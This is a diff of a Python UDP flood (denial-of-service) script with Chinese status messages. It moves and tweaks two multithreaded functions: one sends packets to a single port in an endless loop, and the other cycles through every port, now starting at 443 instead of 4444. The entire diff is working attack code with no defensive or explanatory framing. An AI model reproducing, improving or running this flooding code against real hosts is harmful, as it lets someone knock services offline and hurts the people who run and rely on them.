@@ -33,6 +33,27 @@ def is_valid_ipv4_ipv6(ip , ip_mode):
                     return False
         return True
 
+def dos_1(bytes , ip , port):
+    global condition
+    while condition:
+        try:
+            sock.sendto(bytes , (ip , port))
+        except:
+            pass
+
+def dos_2(bytes , ip):
+    global condition
+    port = 443
+    while condition:
+        try:
+            sock.sendto(bytes , (ip , port))
+            if port == 65535:
+                port = 0
+            else:
+                port += 1
+        except:
+            pass
+
 if name == "nt":
     def clear_shell():
         system("cls")
@@ -141,35 +162,11 @@ clear_shell()
 
 if mode == "1":
     print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip} {port} 端口")
-elif mode == "2":
-    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")
-
-def dos_1(bytes , ip , port):
-    global condition
-    while condition:
-        try:
-            sock.sendto(bytes , (ip , port))
-        except:
-            pass
-
-def dos_2(bytes , ip):
-    global condition
-    port = 4444
-    while condition:
-        try:
-            sock.sendto(bytes , (ip , port))
-            if port == 65535:
-                port = 0
-            else:
-                port += 1
-        except:
-            pass
-
-if mode == "1":
     for i in range(sc):
         dos_sc = Thread(target = dos_1 , args = (bytes , ip , port))
         dos_sc.start()
 elif mode == "2":
+    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")
     for i in range(sc):
         dos_sc = Thread(target = dos_2 , args = (bytes , ip))
         dos_sc.start()
